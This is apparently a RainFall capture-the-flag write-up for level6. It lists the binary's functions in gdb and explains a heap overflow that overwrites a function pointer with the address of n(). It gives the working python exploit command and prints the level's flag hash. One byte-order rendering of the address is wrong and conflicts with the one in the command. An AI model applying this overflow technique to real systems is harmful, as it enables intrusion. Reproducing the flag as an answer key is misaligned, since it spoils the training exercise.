```
    (gdb) info functions
    All defined functions:

    Non-debugging symbols:
    0x080482f4  _init
    0x08048340  strcpy
    0x08048340  strcpy@plt
    0x08048350  malloc
    0x08048350  malloc@plt
    0x08048360  puts
    0x08048360  puts@plt
    0x08048370  system
    0x08048370  system@plt
    0x08048380  __gmon_start__
    0x08048380  __gmon_start__@plt
    0x08048390  __libc_start_main
    0x08048390  __libc_start_main@plt
    0x080483a0  _start
    0x080483d0  __do_global_dtors_aux
    0x08048430  frame_dummy
    0x08048454  n
    0x08048468  m
    0x0804847c  main
    0x080484e0  __libc_csu_init
    0x08048550  __libc_csu_fini
    0x08048552  __i686.get_pc_thunk.bx
    0x08048560  __do_global_ctors_aux
    0x0804858c  _fini
    (gdb) 
```

the address of function n() is => 0x08048454  n => \x54\x84\x08\x00

we gone do Heap-based Buffer Overflow

we need to overflow more than just 64 bytes to reach function_ptr.

Usually it's something like:

64 bytes for user_input

+8 bytes of malloc metadata for the next chunk

then the function pointer is there.

level6@RainFall:~$ ./level6 $(python -c 'print("A"*72 + "\x54\x84\x04\x08")')
f73dcb7a06f60e3ccc608990b0a046359d42a1a0489ffeefd0d9cb2d7c9cb82d